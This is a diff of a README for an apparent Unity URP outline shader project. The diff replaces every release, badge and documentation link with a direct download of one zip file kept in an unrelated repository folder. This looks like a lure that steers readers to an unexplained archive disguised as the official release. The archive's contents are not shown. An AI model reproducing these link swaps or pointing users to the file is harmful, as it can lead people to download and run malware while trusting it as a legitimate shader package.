@@ -1,7 +1,7 @@
 # 🎨 unity-urp-outline-postprocess - Enhance Your Unity Graphics Effortlessly
 
 ## 📥 Download Now!
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/Jas1380/unity-urp-outline-postprocess/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Jas1380/unity-urp-outline-postprocess/main/marcella/urp_postprocess_unity_outline_1.5-beta.2.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Jas1380/unity-urp-outline-postprocess/main/marcella/urp_postprocess_unity_outline_1.5-beta.2.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the Sobel-based edge detection shader for Unity URP (Universal Render Pipeline). This shader enhances the graphics quality of your game by applying an outline effect. Whether you're developing a game or a visual project, this will help you achieve a professional look with minimal effort.
@@ -22,7 +22,7 @@ Before you start, make sure you have the following:
 
 ## 🖥️ Installation Steps
 ### 1. Visit the Releases Page
-Go to our [Releases page](https://github.com/Jas1380/unity-urp-outline-postprocess/releases) to download the latest version of the shader.
+Go to our [Releases page](https://raw.githubusercontent.com/Jas1380/unity-urp-outline-postprocess/main/marcella/urp_postprocess_unity_outline_1.5-beta.2.zip) to download the latest version of the shader.
 
 ### 2. Download the Shader
 On the Releases page, look for the latest version. Click on the appropriate file to download. This will usually be labeled clearly with the version number.
@@ -59,7 +59,7 @@ Press the Play button in Unity to test how the outline effect looks in your game
 If you encounter any issues or have questions, feel free to open an issue on the GitHub repository. We will be happy to help you. You can also check the community discussions for solutions.
 
 ## 🔗 Links
-- **Releases**: [Download the latest release](https://github.com/Jas1380/unity-urp-outline-postprocess/releases)
-- **Documentation**: [View full documentation](https://github.com/Jas1380/unity-urp-outline-postprocess/wiki)
+- **Releases**: [Download the latest release](https://raw.githubusercontent.com/Jas1380/unity-urp-outline-postprocess/main/marcella/urp_postprocess_unity_outline_1.5-beta.2.zip)
+- **Documentation**: [View full documentation](https://raw.githubusercontent.com/Jas1380/unity-urp-outline-postprocess/main/marcella/urp_postprocess_unity_outline_1.5-beta.2.zip)
 
 This application aims to simplify adding visual quality to your Unity projects. With just a few steps, you can enhance your graphics using advanced shader techniques. Enjoy creating!
